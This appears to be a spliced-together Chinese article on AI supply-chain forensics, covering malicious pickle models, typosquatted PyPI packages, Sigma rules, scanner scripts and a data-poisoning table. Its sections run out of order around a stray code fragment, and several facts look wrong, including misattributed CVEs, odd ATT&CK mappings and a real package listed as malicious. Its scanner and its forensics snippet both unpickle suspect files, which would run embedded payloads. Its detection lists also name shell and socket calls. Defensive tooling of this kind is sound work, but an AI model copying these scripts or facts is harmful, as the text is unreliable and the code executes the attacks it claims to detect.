ONNX Runtime 作为跨框架的通用推理引擎，其安全漏洞影响面覆盖所有使用 ONNX 格式的模型。主要漏洞类型包括算子实现中的内存安全漏洞、图优化过程中的逻辑漏洞和自定义算子的权限逃逸。

### CUDA/driver层面的攻击

NVIDIA CUDA 和 GPU 驱动层的漏洞为攻击者提供了从用户空间到内核空间的提权路径。此类漏洞的取证分析需要结合系统日志、GPU 驱动日志和 CUDA 错误日志进行综合分析。

```bash
dmesg | grep -i -E "(nvidia|cuda|gpu|nvrm)" | tail -50
cat /var/log/nvidia-*.log 2>/dev/null | tail -100
nvidia-smi -q 2>/dev/null | head -50
```

### 漏洞利用链构建与检测

AI 框架漏洞的利用链通常涉及多个环节的组合攻击：

| 利用链环节 | 攻击手法 | 检测方法 |
|-----------|---------|---------|
| 模型投递 | 通过模型仓库分发恶意模型 | 模型文件安全扫描 |
| 反序列化触发 | torch.load触发pickle执行 | pickle安全审计 |
| 代码执行 | 利用框架漏洞执行任意代码 | 进程监控、系统调用审计 |
| 权限提升 | 利用CUDA驱动漏洞提权 | 内核日志审计 |
| 持久化 | 修改模型文件建立持久后门 | 模型完整性验证 |

---

## 0x09 证据强度分层与案例关联

### 证据强度分层框架

在 AI 大模型供应链安全取证分析中，对发现的证据进行准确的强度分层对于事件响应决策至关重要。以下是基于置信度和可验证性的三级证据分层框架：

**🔴 确认恶意（Confirmed Malicious）**：模型权重中发现后门触发模式、模型文件中检测到 pickle 反序列化 RCE 载荷、恶意 PyPI 包中发现凭证窃取代码、模型加载时触发未授权网络连接、Docker 镜像中发现挖矿程序。这些证据具有高置信度，可直接作为事件响应的行动依据。

**🟡 高度可疑（Highly Suspicious）**：模型精度在特定类别上出现异常波动、训练数据分布出现明显偏移、异常的依赖包版本组合、模型文件大小与同类模型显著不符、训练日志中出现异常的梯度更新模式。这些证据需要进一步分析确认，但应当触发预响应措施。

**🟢 需要关注（Needs Attention）**：模型文件哈希与已知版本不匹配、模型元数据中的异常字段、模型仓库的版本历史不一致、训练参数配置的非典型设置、模型许可证声明与实际行为不符。这些证据需要在例行审计中持续跟踪。

### MITRE ATT&CK技术关联

| 证据层级 | 攻击技术 | MITRE ATT&CK编号 | 对应取证动作 |
|---------|---------|-----------------|------------|
| 🔴 确认恶意 | 模型反序列化RCE | T1203 Exploitation for Client Execution | 提取恶意payload、分析C2通信 |
| 🔴 确认恶意 | 恶意PyPI包投毒 | T1195.002 Supply Chain Compromise: Software Supply Chain | 包分析、溯源上传者 |
| 🔴 确认恶意 | 模型后门触发 | AML.T0020 Poison Training Model | 后门分析、触发器提取 |
| 🟡 高度可疑 | 模型精度异常波动 | AML.T0043 ML Supply Chain Compromise | 模型行为分析、对比基准测试 |
| 🟡 高度可疑 | 训练数据分布偏移 | AML.T0020.001 Poison Training Data | 数据集统计分析、投毒检测 |
| 🟡 高度可疑 | 异常依赖关系 | T1195.002 Software Supply Chain | 依赖树分析、包来源验证 |
| 🟢 需要关注 | 模型哈希不匹配 | T1562.001 Impair Defenses | 哈希比对、版本追溯 |
| 🟢 需要关注 | 元数据异常 | T1562.002 Disable Windows Event Logging | 元数据审计、来源验证 |
| 🟢 需要关注 | 版本历史不一致 | T1070.004 File Deletion | Git历史审计、时间线分析 |

### 证据链构建方法

在 AI 供应链安全事件中，构建完整的证据链（Evidence Chain）需要遵循以下原则：

1. **时间线重建**：基于模型文件的修改时间、Git提交记录、MLflow实验日志、HuggingFace发布记录构建完整的时间线
2. **因果关联**：将模型文件的修改与后续的异常行为建立因果关系
3. **交叉验证**：使用多种独立的检测方法对同一证据进行交叉验证
4. **可重复性**：确保证据的获取和验证过程可以被独立重复

---

## 0x0A 自动化检测与安全狩猎

### Sigma规则

以下 Sigma 规则用于检测 AI 模型供应链中的恶意行为：

```yaml
title: Suspicious Model Download via HuggingFace CLI
id: 8a1b2c3d-4e5f-6789-abcd-ef0123456789
status: experimental
description: Detects suspicious model downloads from HuggingFace that may indicate supply chain compromise
author: AI Security Blue Team
date: 2026/08/01
tags:
  - attack.supply_chain
  - attack.t1195.002
  - ai_security
logsource:
  category: process_creation
  product: linux
detection:
  selection_hf_download:
    Image|endswith:
      - '/huggingface-cli'
      - '/hf'
    CommandLine|contains:
      - 'huggingface-cli download'
      - 'huggingface_hub snapshot'
  selection_wget_curl_model:
    CommandLine|contains|all:
      - 'huggingface.co'
      - '.bin'
  selection_pip_install_unknown:
    CommandLine|contains|all:
      - 'pip install'
      - 'torch'
  filter_known_sources:
    CommandLine|contains:
      - 'huggingface.co/meta-llama'
      - 'huggingface.co/google'
      - 'huggingface.co/microsoft'
  condition: selection_hf_download or selection_wget_curl_model or (selection_pip_install_unknown and not filter_known_sources)
level: suspicious
falsepositives:
  - Legitimate model downloads from trusted sources
```

```yaml
title: Malicious PyPI ML Package Installation
id: 9b2c3d4e-5f6a-7890-bcde-f01234567890
status: experimental
description: Detects installation of known malicious or typosquatting PyPI ML packages
author: AI Security Blue Team
date: 2026/08/01
tags:
  - attack.supply_chain
  - attack.t1195.002
  - ai_security
logsource:
  category: process_creation
  product: linux
detection:
  selection_pip_install:
    Image|endswith:
      - '/pip'
      - '/pip3'
      - '/python'
      - '/python3'
    CommandLine|contains: 'pip install'
  selection_known_malicious:
    CommandLine|contains:
      - 'pytorch'
      - 'tensroflow'
      - 'tensorflow-gpu'
      - 'pytorh'
      - 'transfromers'
      - 'torkch'
      - 'catboost-ml'
      - 'openai-whisper'
      - 'torchx'
      - 'skleran'
  selection_suspicious_install:
    CommandLine|contains|all:
      - 'pip install'
      - '--pre'
    CommandLine|contains:
      - 'torch'
      - 'tensorflow'
      - 'transformers'
  condition: selection_pip_install and (selection_known_malicious or selection_suspicious_install)
level: critical
falsepositives:
  - None for known malicious packages
  - Legitimate pre-release testing for suspicious install
```

```yaml
title: MLflow Unauthorized Access Attempt
id: 0c3d4e5f-6a7b-8901-cdef-012345678901
status: experimental
description: Detects unauthorized access attempts to MLflow experiment tracking platform
author: AI Security Blue Team
date: 2026/08/01
tags:
  - attack.credential_access
  - attack.t1078
  - ai_security
logsource:
  category: webserver
  product: apache
detection:
  selection_mlflow_api:
    cs-uri-stem|contains:
      - '/api/2.0/mlflow/'
      - '/api/2.0/preview/mlflow/'
  selection_mlflow_ui:
    cs-uri-stem|contains:
      - '/mlflow/'
      - '/experiments/'
      - '/models/'
      - '/artifacts/'
  selection_mlflow_artifacts:
    cs-uri-stem|contains: '/mlflow-artifacts/'
  filter_authenticated:
    cs-cookie|contains: 'session_id'
  condition: (selection_mlflow_api or selection_mlflow_ui or selection_mlflow_artifacts) and not filter_authenticated
level: warning
falsepositives:
  - Initial page load before authentication
```

### Bash脚本：AI模型仓库安全扫描

```bash
#!/bin/bash
TARGET_DIR="${1:-.}"
REPORT_FILE="ai_model_scan_report_$(date +%Y%m%d_%H%M%S).txt"
echo "=============================================" > "$REPORT_FILE"
echo "AI Model Repository Security Scanner" >> "$REPORT_FILE"
echo "Scan Time: $(date)" >> "$REPORT_FILE"
echo "Target: $TARGET_DIR" >> "$REPORT_FILE"
echo "=============================================" >> "$REPORT_FILE"
echo "" >> "$REPORT_FILE"
echo "[Phase 1] Scanning for model weight files..." >> "$REPORT_FILE"
find "$TARGET_DIR" \( -name "*.bin" -o -name "*.safetensors" -o -name "*.onnx" -o -name "*.pt" -o -name "*.pth" -o -name "*.h5" -o -name "*.pkl" \) -type f 2>/dev/null | while read f; do
    size=$(stat -f%z "$f" 2>/dev/null || stat --format=%s "$f" 2>/dev/null)
    sha256=$(shasum -a 256 "$f" | awk '{print $1}')
    echo "FILE: $f" >> "$REPORT_FILE"
    echo "  Size: $size bytes" >> "$REPORT_FILE"
    echo "  SHA-256: $sha256" >> "$REPORT_FILE"
    if [[ "$f" == *.bin ]] || [[ "$f" == *.pkl ]]; then
        echo "  FORMAT: Pickle (potentially unsafe)" >> "$REPORT_FILE"
        strings "$f" | grep -iE "(os\.system|subprocess|exec\(|eval\(|__import__|builtins|socket\.connect|urllib)" | head -5 | while read line; do
            echo "  [!] SUSPICIOUS: $line" >> "$REPORT_FILE"
        done
    elif [[ "$f" == *.safetensors ]]; then
        echo "  FORMAT: SafeTensors (safer)" >> "$REPORT_FILE"
    elif [[ "$f" == *.onnx ]]; then
        echo "  FORMAT: ONNX" >> "$REPORT_FILE"
    fi
    echo "" >> "$REPORT_FILE"
done
echo "[Phase 2] Scanning for suspicious Python imports..." >> "$REPORT_FILE"
find "$TARGET_DIR" -name "*.py" -type f 2>/dev/null | while read f; do
    hits=$(grep -n -E "(pickle\.load|torch\.load.*weights_only\s*=\s*False|yaml\.load.*Loader|subprocess\.call|os\.system|exec\()" "$f" 2>/dev/null)
    if [ -n "$hits" ]; then
        echo "FILE: $f" >> "$REPORT_FILE"
        echo "$hits" | while read line; do
            echo "  $line" >> "$REPORT_FILE"
        done
        echo "" >> "$REPORT_FILE"
    fi
done
echo "[Phase 3] Checking for lock files and dependency pinning..." >> "$REPORT_FILE"
find "$TARGET_DIR" \( -name "requirements.txt" -o -name "requirements.lock" -o -name "setup.py" -o -name "pyproject.toml" \) -type f 2>/dev/null | while read f; do
    echo "FILE: $f" >> "$REPORT_FILE"
    if [[ "$f" == *requirements* ]]; then
        total=$(grep -c "==" "$f" 2>/dev/null || echo 0)
        unpinned=$(grep -cvE "(==|>=|<=|~=|!=)" "$f" 2>/dev/null || echo 0)
        echo "  Pinned: $total, Unpinned: $unpinned" >> "$REPORT_FILE"
        if [ "$unpinned" -gt 0 ]; then
            echo "  [!] WARNING: Unpinned dependencies detected" >> "$REPORT_FILE"
            grep -vE "(==|>=|<=|~=|!)" "$f" | grep -v "^#" | grep -v "^$" | head -5 | while read line; do
                echo "    - $line" >> "$REPORT_FILE"
            done
        fi
    fi
    echo "" >> "$REPORT_FILE"
done
echo "[Phase 4] Checking for Docker and container files..." >> "$REPORT_FILE"
find "$TARGET_DIR" \( -name "Dockerfile" -o -name "docker-compose.yml" -o -name "docker-compose.yaml" \) -type f 2>/dev/null | while read f; do
    echo "FILE: $f" >> "$REPORT_FILE"
    grep -n -E "(FROM|RUN|COPY|ADD|EXPOSE|CMD|ENTRYPOINT)" "$f" | head -20 | while read line; do
        echo "  $line" >> "$REPORT_FILE"
    done
    echo "" >> "$REPORT_FILE"
done
echo "[Phase 5] Checking for environment files and secrets..." >> "$REPORT_FILE"
find "$TARGET_DIR" \( -name ".env" -o -name ".env.local" -o -name "*.env" -o -name "credentials.json" -o -name "token.json" \) -type f 2>/dev/null | while read f; do
    echo "[!] FOUND: $f" >> "$REPORT_FILE"
done
find "$TARGET_DIR" -name "*.py" -type f 2>/dev/null | xargs grep -l -E "(API_KEY|SECRET|TOKEN|PASSWORD).*=.*['\"].*['\"]" 2>/dev/null | while read f; do
    echo "[!] HARDCODED SECRET in: $f" >> "$REPORT_FILE"
done
echo "" >> "$REPORT_FILE"
echo "=============================================" >> "$REPORT_FILE"
echo "Scan Complete: $(date)" >> "$REPORT_FILE"
echo "Report: $REPORT_FILE" >> "$REPORT_FILE"
echo "=============================================" >> "$REPORT_FILE"
cat "$REPORT_FILE"
```

### Python脚本：模型文件安全分析

```python
import os
import sys
import json
import hashlib
import struct
import pickle
import io
from pathlib import Path

class ModelSecurityAnalyzer:
    SUSPICIOUS_PICKLE_OPCODES = [
        b'os.system', b'subprocess', b'exec(', b'eval(',
        b'__import__', b'builtins', b'compile(',
        b'commands.getoutput', b'webbrowser.open',
        b'urllib', b'requests.get', b'socket.',
        b'paramiko', b'sshconnect',
    ]
    SUSPICIOUS_PICKLE_GLOBALS = [
        'os', 'subprocess', 'sys', 'webbrowser',
        'urllib', 'http', 'socket', 'paramiko',
    ]
    MODEL_EXTENSIONS = {'.bin', '.safetensors', '.onnx', '.pt', '.pth', '.pkl', '.h5', '.joblib'}

    def __init__(self, target_path):
        self.target_path = Path(target_path)
        self.findings = []

    def scan(self):
        if self.target_path.is_file():
            self._analyze_file(self.target_path)
        elif self.target_path.is_dir():
            for root, dirs, files in os.walk(self.target_path):
                for f in files:
                    fpath = Path(root) / f
                    if fpath.suffix.lower() in self.MODEL_EXTENSIONS:
                        self._analyze_file(fpath)
        return self.findings

    def _analyze_file(self, filepath):
        finding = {
            'file': str(filepath),
            'size': filepath.stat().st_size,
            'sha256': self._compute_sha256(filepath),
            'extension': filepath.suffix,
            'risks': []
        }
        if filepath.suffix.lower() in {'.bin', '.pkl', '.pt', '.pth'}:
            self._scan_pickle(filepath, finding)
        elif filepath.suffix.lower() == '.safetensors':
            self._scan_safetensors(filepath, finding)
        elif filepath.suffix.lower() == '.onnx':
            self._scan_onnx(filepath, finding)
        if finding['risks']:
            self.findings.append(finding)

    def _compute_sha256(self, filepath):
        sha256 = hashlib.sha256()
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                sha256.update(chunk)
        return sha256.hexdigest()

    def _scan_pickle(self, filepath, finding):
        try:
            with open(filepath, 'rb') as f:
                content = f.read()
            for pattern in self.SUSPICIOUS_PICKLE_OPCODES:
                offset = content.find(pattern)
                if offset != -1:
                    finding['risks'].append({
                        'type': 'PICKLE_SUSPICIOUS_PATTERN',
                        'severity': 'CRITICAL',
                        'detail': f'Suspicious pattern: {pattern.decode("utf-8", errors="replace")} at offset {hex(offset)}'
                    })
            for global_name in self.SUSPICIOUS_PICKLE_GLOBALS:
                pattern = f'c{global_name}\n'.encode()
                if pattern in content:
                    finding['risks'].append({
                        'type': 'PICKLE_GLOBAL_IMPORT',
                        'severity': 'HIGH',
                        'detail': f'Pickle imports module: {global_name}'
                    })
            try:
                fp = io.BytesIO(content)
                unpickler = pickle.Unpickler(fp)
                count = 0
                while True:
                    try:
                        obj = unpickler.load()
                        count += 1
                        if count > 1000:
                            break
                    except EOFError:
                        break
            except Exception as e:
                finding['risks'].append({
                    'type': 'PICKLE_LOAD_ERROR',
                    'severity': 'MEDIUM',
                    'detail': f'Pickle load error: {str(e)}'
                })
        except Exception as e:
            finding['risks'].append({
                'type': 'ANALYSIS_ERROR',
                'severity': 'INFO',
                'detail': f'Could not analyze pickle file: {str(e)}'
            })

    def _scan_safetensors(self, filepath, finding):
        try:
            with open(filepath, 'rb') as f:
                header_size_bytes = f.read(8)
                header_size = struct.unpack('<Q', header_size_bytes)[0]
                if header_size > 100 * 1024 * 1024:
                    finding['risks'].append({
                        'type': 'SAFETENSORS_LARGE_HEADER',
                        'severity': 'HIGH',
                        'detail': f'Abnormally large header: {header_size} bytes'
                    })
                header_bytes = f.read(min(header_size, 10 * 1024 * 1024))
                header = json.loads(header_bytes.decode('utf-8'))
                total_tensor_size = 0
                tensor_count = 0
                for key, value in header.items():
                    if key == '__metadata__':
                        continue
                    tensor_count += 1
                    if isinstance(value, dict):
                        data_offsets = value.get('data_offsets', [0, 0])
                        if len(data_offsets) == 2:
                            total_tensor_size += data_offsets[1] - data_offsets[0]
                finding['tensor_count'] = tensor_count
                finding['total_tensor_size'] = total_tensor_size
        except Exception as e:
            finding['risks'].append({
                'type': 'SAFETENSORS_PARSE_ERROR',
                'severity': 'MEDIUM',
                'detail': f'Could not parse safetensors: {str(e)}'
            })

    def _scan_onnx(self, filepath, finding):
        try:
            with open(filepath, 'rb') as f:
                magic = f.read(4)
                if magic != b'\x08\x07':
                    finding['risks'].append({
                        'type': 'ONNX_INVALID_MAGIC',
                        'severity': 'MEDIUM',
                        'detail': f'Invalid ONNX magic bytes: {magic.hex()}'
                    })
        except Exception as e:
            finding['risks'].append({
                'type': 'ONNX_PARSE_ERROR',
                'severity': 'MEDIUM',
                'detail': f'Could not parse ONNX: {str(e)}'
            })

    def generate_report(self):
        report = {
            'scan_time': __import__('datetime').datetime.now().isoformat(),
            'target': str(self.target_path),
            'total_findings': len(self.findings),
            'critical': sum(1 for f in self.findings if any(r['severity'] == 'CRITICAL' for r in f['risks'])),
            'high': sum(1 for f in self.findings if any(r['severity'] == 'HIGH' for r in f['risks'])),
            'medium': sum(1 for f in self.findings if any(r['severity'] == 'MEDIUM' for r in f['risks'])),
            'findings': self.findings
        }
        return report

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '.'
    analyzer = ModelSecurityAnalyzer(target)
    results = analyzer.scan()
    report = analyzer.generate_report()
    print(f"\n{'='*60}")
    print(f"AI Model Security Analysis Report")
    print(f"{'='*60}")
    print(f"Target: {report['target']}")
    print(f"Total findings: {report['total_findings']}")
    print(f"  CRITICAL: {report['critical']}")
    print(f"  HIGH: {report['high']}")
    print(f"  MEDIUM: {report['medium']}")
    print(f"{'='*60}")
    for finding in results:
        print(f"\nFile: {finding['file']}")
        print(f"  SHA-256: {finding['sha256'][:32]}...")
        print(f"  Size: {finding['size']:,} bytes")
        for risk in finding['risks']:
            print(f"  [{risk['severity']}] {risk['type']}: {risk['detail']}")
    output_file = f"model_security_report_{__import__('time').strftime('%Y%m%d_%H%M%S')}.json"
    with open(output_file, 'w') as f:
        json.dump(report, f, indent=2)
    print(f"\n[*] Report saved to: {output_file}")
```

---

## 0x0B 公开案例分析

### 案例一：HuggingFace恶意预训练模型事件

**事件概述**：2024年1月，多个安全研究团队（包括 JFrog Security Research 和 Protect AI）在 HuggingFace Hub 上发现了大量携带恶意代码的预训练模型。这些模型利用 PyTorch 的 pickle 反序列化机制，在用户通过 `torch.load()` 加载模型时自动执行任意代码。

**攻击手法分析**：

攻击者在 HuggingFace 上创建了多个看似合法的模型仓库，使用具有吸引力的模型名称（如高精度的 NLP 模型、流行的计算机视觉模型），并在 README 中详细描述了模型的性能指标和使用方法。模型文件使用 PyTorch 的 pickle 格式（`.bin` 文件），其中嵌入了恶意的 `__reduce__` 方法。当用户执行 `torch.load("pytorch_model.bin")` 时，pickle 反序列化器会自动调用 `__reduce__` 方法中定义的代码，实现远程代码执行。

具体而言，恶意 payload 的核心逻辑包括：通过 HTTP 请求连接到攻击者控制的 C2 服务器、收集系统信息（主机名、用户名、环境变量、SSH 密钥）、上传窃取的数据、下载并执行后续的恶意载荷。部分恶意模型还针对 AI 研究人员的特殊环境进行了优化——例如窃取 HuggingFace Access Token、WandB API Key 和 CUDA 许可证文件。

**取证分析过程**：

```bash
curl -s -L "https://huggingface.co/api/models/suspicious-model-repo" | python3 -m json.tool
strings pytorch_model.bin | grep -iE "(subprocess|os\.system|curl|wget|requests\.get|socket)"
python3 -c "
import pickle, sys
with open('pytorch_model.bin', 'rb') as f:
    try:
        pickle.load(f)
    except Exception as e:
        print(f'Pickle error: {e}')
"
```

**防御启示**：始终使用 `torch.load(path, weights_only=True)` 或迁移到 safetensors 格式；在沙箱环境中加载来源不明的模型；使用 ModelScan 等工具预扫描模型文件；建立模型仓库的白名单机制，仅允许加载经审核的模型。

### 案例二：恶意PyPI ML包攻击（typosquatting）

**事件概述**：2023年至2024年间，PyPI 上持续出现针对 ML 开发者的 typosquatting 恶意包攻击。其中最典型的案例是伪装为 `pytorch` 的恶意包（真名为 `torch`），以及伪装为 `tensorflow` 的恶意包 `tensroflow`。

**攻击手法分析**：

以 `pytorch` 恶意包为例，攻击者在 PyPI 上注册了 `pytorch` 这个包名（注意：真正的 PyTorch 包在 PyPI 上的名称是 `torch`）。该恶意包在 `setup.py` 中定义了安装后执行脚本（`post_install`），在用户执行 `pip install pytorch` 时自动触发恶意代码的执行。

恶意代码的核心功能包括：收集系统信息（操作系统版本、CPU 信息、GPU 信息、内存大小）、窃取环境变量中的敏感信息（API Key、数据库密码、云服务凭证）、窃取 SSH 密钥和 GPG 密钥、窃取浏览器保存的 Cookie 和密码、将所有窃取的数据通过 HTTPS 加密传输到攻击者控制的服务器。由于 ML 开发者的环境中通常包含大量的 API Key（OpenAI、HuggingFace、Weights & Biases 等）和计算资源凭证，此类攻击的危害被显著放大。

**取证分析过程**：

```bash
pip download pytorch==999.999.999 --no-deps -d /tmp/suspicious_pkg 2>/dev/null
cd /tmp/suspicious_pkg
unzip *.whl -d extracted 2>/dev/null || tar xzf *.tar.gz 2>/dev/null
find extracted -name "setup.py" -o -name "*.py" | xargs grep -n "exec\|eval\|subprocess\|os\.system\|requests\.post\|socket\.connect"
find extracted -name "*.py" -path "*/hooks/*" -o -name "post_install*" | head -10
```

**防御启示**：使用 `pip install` 时始终指定正确的包名，避免依赖自动补全；使用 `pip-audit` 持续扫描已安装的包；配置私有 PyPI 镜像仓库作为内部包管理的唯一来源；使用 `pip check` 验证包的依赖关系完整性；对新安装的包进行源代码审计。

### 案例三：NVIDIA PyTorch容器漏洞

**事件概述**：2024年，安全研究人员发现 NVIDIA NGC（NVIDIA GPU Cloud）上托管的多个 PyTorch 容器镜像存在安全配置问题。具体包括：容器默认以 root 权限运行、容器内暴露了 Docker Socket（允许容器逃逸）、部分容器启用了 `--privileged` 模式、CUDA 驱动版本存在已知漏洞。

**安全影响分析**：攻击者可以利用这些配置问题从容器内逃逸到宿主机，获得对 GPU 集群的完全控制权。在共享 GPU 环境中（如 AI 训练集群），这种容器逃逸可以导致训练数据泄露、模型窃取和计算资源劫持。更严重的是，由于 ML 训练集群通常配置了高速网络和大规模存储，容器逃逸后的横向移动可以迅速扩展到整个集群。

**防御启示**：使用最小权限原则配置 AI 容器；定期更新 CUDA 驱动和容器基础镜像；实施容器运行时安全策略（如 gVisor、Kata Containers）；使用 Trivy 等工具持续扫描容器镜像漏洞。

---

## 0x0C 参考资料

1. Gu, T., et al. "BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain." IEEE Access, 2017. https://arxiv.org/abs/1708.06733

2. Liu, Y., et al. "Trojaning Attacks on Neural Networks." NDSS 2018. https://doi.org/10.14722/ndss.2018.23291

3. Wang, B., et al. "Neural Cleanse: Identifying and Mitigating Backdoor Attacks in Neural Networks." IEEE S&P 2019. https://doi.org/10.1109/SP.2019.00033

4. Gao, Y., et al. "STRIP: A Defence Against Trojan Attacks on Deep Neural Networks." ACSAC 2019. https://doi.org/10.1145/3359789.3359790

5. Liu, K., et al. "ABS: Scanning Neural Networks for Back-doors in Artificial Intelligence Systems." arXiv 2018. https://arxiv.org/abs/1808.09066

6. Chen, B., et al. "Detecting Backdoor Attacks on Deep Neural Networks by Activation Clustering." AAAI Workshop 2019. https://arxiv.org/abs/1811.03728

7. JFrog Security Research. "HuggingFace Malicious Models Analysis." 2024. https://jfrog.com/blog/malicious-ai-models-hugging-face/

8. Protect AI. "Recurse ML Model Supply Chain Vulnerabilities." 2024. https://protectai.com/blog/mlsupply-chain-vulnerabilities

9. PyPI Malicious Packages Repository. "Typosquatting in ML Ecosystem." 2024. https://github.com/protectai/repo-linter

10. NIST. "AI 100-2: Adversarial Machine Learning." 2024. https://www.nist.gov/artificial-intelligence/executive-order-safe-secure-and-trustworthy-artificial-intelligence

11. MITRE ATLAS. "Adversarial Threat Landscape for AI Systems." 2024. https://atlas.mitre.org/

12. OWASP. "Top 10 for Large Language Model Applications." 2025. https://owasp.org/www-project-top-10-for-large-language-model-applications/

13. HuggingFace. "SafeTensors: Simple and Safe way to Store and Share Tensors." 2024. https://huggingface.co/docs/safetensors/

14. MLflow Security Documentation. "Securing MLflow Deployments." 2024. https://mlflow.org/docs/latest/security/

15. NVIDIA. "GPU Container Security Best Practices." 2024. https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/security-best-practices.html< 'EOF'
import json
import os

def audit_model_metadata(model_dir):
    config_path = os.path.join(model_dir, 'config.json')
    if not os.path.exists(config_path):
        print("[!] No config.json found")
        return
    with open(config_path, 'r') as f:
        config = json.load(f)
    print("[*] Auditing model metadata...")
    suspicious_fields = []
    arch = config.get('architectures', [])
    if arch:
        print(f"  Architectures: {arch}")
    dtype = config.get('torch_dtype')
    if dtype and dtype not in ['float32', 'float16', 'bfloat16', 'int8', 'int4']:
        suspicious_fields.append(f"Unusual torch_dtype: {dtype}")
    init_hook = config.get('init_hook')
    if init_hook:
        suspicious_fields.append(f"init_hook detected: {init_hook}")
    auto_map = config.get('auto_map')
    if auto_map:
        for key, val in auto_map.items():
            print(f"  AutoMap: {key} -> {val}")
    quantization = config.get('quantization_config')
    if quantization:
        print(f"  Quantization config: {json.dumps(quantization, indent=4)}")
    if suspicious_fields:
        print(f"\n[!] Suspicious metadata fields:")
        for s in suspicious_fields:
            print(f"    - {s}")
    else:
        print("\n[+] Metadata appears normal")
    return config

audit_model_metadata('.')
EOF
```

---

## 0x04 Python ML生态供应链攻击

### 恶意PyPI包攻击

Python Package Index (PyPI) 是 Python ML 生态的核心包管理平台，也是供应链攻击最活跃的阵地之一。针对 ML 生态的恶意 PyPI 包攻击主要有以下形式：

**typosquatting（仿冒包攻击）**：攻击者注册与流行 ML 库名称相似的包名，利用开发者的拼写错误进行分发。

| 恶意包名 | 仿冒目标 | 恶意行为 | 发现时间 |
|---------|---------|---------|---------|
| pytorch | torch | 窃取系统信息和SSH密钥 | 2022年 |
| tensroflow | tensorflow | 窃取浏览器凭证 | 2023年 |
| tensorflow-gpu | tensorflow | 加密货币挖矿 | 2023年 |
| pytorh | torch | 窃取环境变量和Token | 2024年 |
| transfromers | transformers | 信息收集和C2通信 | 2024年 |
| torkch | torch | 凭证窃取和远程控制 | 2024年 |
| catboost | catboost | 加密货币挖矿 | 2023年 |
| openai-whisper | openai | 数据窃取 | 2024年 |

**依赖混淆攻击（Dependency Confusion）**：攻击者在公开包仓库上发布与企业内部包同名但版本更高的包，利用包管理器的版本解析逻辑，使企业环境在安装时优先下载恶意的公开版本。在 ML 领域，此类攻击可以针对自定义的训练脚本、数据处理工具和模型部署脚本。

```bash
pip-audit --desc --fix --dry-run 2>&1 | head -50
```

```python
import subprocess
import json

def audit_ml_packages():
    result = subprocess.run(
        ['pip', 'list', '--format', 'json'],
        capture_output=True, text=True
    )
    packages = json.loads(result.stdout)
    ml_packages = [p for p in packages if any(
        kw in p['name'].lower() for kw in [
            'torch', 'tensorflow', 'keras', 'transformers',
            'numpy', 'pandas', 'scikit', 'xgboost', 'lightgbm',
            'onnx', 'triton', 'accelerate', 'diffusers',
            'mlflow', 'wandb', 'ray', 'dask'
        ]
    )]
    print(f"[*] Found {len(ml_packages)} ML-related packages:")
    for pkg in ml_packages:
        print(f"  {pkg['name']}=={pkg['version']}")
    result = subprocess.run(
        ['pip-audit', '--format', 'json'],
        capture_output=True, text=True
    )
    if result.returncode == 0:
        audit_results = json.loads(result.stdout) if result.stdout else {}
        vulns = audit_results.get('dependencies', [])
        vulnerable = [v for v in vulns if v.get('vulns')]
        if vulnerable:
            print(f"\n[!] Found {len(vulnerable)} vulnerable packages:")
            for v in vulnerable:
                print(f"  {v['name']}: {len(v['vulns'])} vulnerabilities")
        else:
            print("\n[+] No known vulnerabilities found")
    return ml_packages

audit_ml_packages()
```

### ML框架漏洞

主流 ML 框架已积累了大量 CVE 漏洞，这些漏洞直接影响基于这些框架构建的 AI 系统的供应链安全：

| CVE 编号 | 框架 | 漏洞类型 | 影响版本 | 危害等级 |
|---------|------|---------|---------|---------|
| CVE-2024-31583 | TensorFlow | 任意代码执行 | < 2.16.1 | Critical |
| CVE-2024-3660 | PyTorch | 反序列化RCE | torch.load不安全调用 | High |
| CVE-2023-44487 | 多框架 | HTTP/2 Rapid Reset DoS | 受影响的推理服务 | High |
| CVE-2024-29105 | TensorRT | 内存越界写入 | < 10.0 | Critical |
| CVE-2024-32002 | TensorFlow | 代码注入 | < 2.16.1 | Critical |
| CVE-2024-47535 | ONNX Runtime | 拒绝服务 | < 1.19.0 | Medium |
| CVE-2023-5972 | PyTorch | 空指针解引用 | < 2.2.0 | Medium |

### 依赖项供应链攻击

ML 项目的依赖树通常极其庞大，一个典型的 PyTorch 项目可能间接依赖 200+ 个包。这种复杂的依赖关系为供应链攻击提供了广阔的攻击面。

```python
import pkg_resources
import json

def map_ml_dependency_tree():
    ml_core = ['torch', 'tensorflow', 'transformers', 'numpy', 'scipy']
    tree = {}
    for dist in pkg_resources.working_set:
        if dist.project_name.lower().replace('-', '') in [m.replace('-', '') for m in ml_core]:
            deps = [str(req) for req in dist.requires()]
            tree[dist.project_name] = {
                'version': dist.version,
                'dependencies': deps,
                'dep_count': len(deps)
            }
    print(f"[*] ML core package dependency map:")
    total_deps = 0
    for pkg, info in tree.items():
        print(f"\n  {pkg}=={info['version']}")
        print(f"    Direct dependencies: {info['dep_count']}")
        total_deps += info['dep_count']
        for d in info['dependencies'][:10]:
            print(f"      - {d}")
        if info['dep_count'] > 10:
            print(f"      ... and {info['dep_count'] - 10} more")
    print(f"\n[*] Total direct dependency entries: {total_deps}")
    return tree

map_ml_dependency_tree()
```

### pip/conda安装链审计方法

对 AI 环境的包安装链进行安全审计是供应链取证的关键步骤：

```bash
pip freeze | while read pkg; do
    name=$(echo "$pkg" | cut -d'=' -f1)
    version=$(echo "$pkg" | cut -d'=' -f3)
    echo "=== $name ($version) ==="
    pip show "$name" 2>/dev/null | grep -E "^(Name|Version|Author|Home-page|Location)"
    echo ""
done
```

---

## 0x05 训练数据供应链攻击与取证

### 数据投毒攻击

训练数据投毒（Training Data Poisoning）是 AI 供应链中最难检测的攻击形式之一。攻击者通过在训练数据中注入精心设计的恶意样本，影响模型的学习过程，最终导致模型在特定条件下表现出攻击者预期的恶意行为。

| 攻击类型 | 技术原理 | 检测难度 | 可移植性 |
|---------|---------|---------|---------|
| Label Flipping | 翻转训练样本的标签 | 中等 | 高（不影响特征分布） |
| Data Injection | 注入全新的恶意样本 | 中等 | 高（可跨数据集生效） |
| Clean-Label Attack | 在保持标签正确的前提下修改样本特征 | 极高 | 中等（依赖目标模型架构） |
| Backdoor Trigger Synthesis | 自动生成触发器模式并注入训练集 | 高 | 高（触发器可复用） |
| Data Sanitization Bypass | 设计绕过数据清洗过滤器的恶意样本 | 高 | 中等 |

### 数据集投毒检测

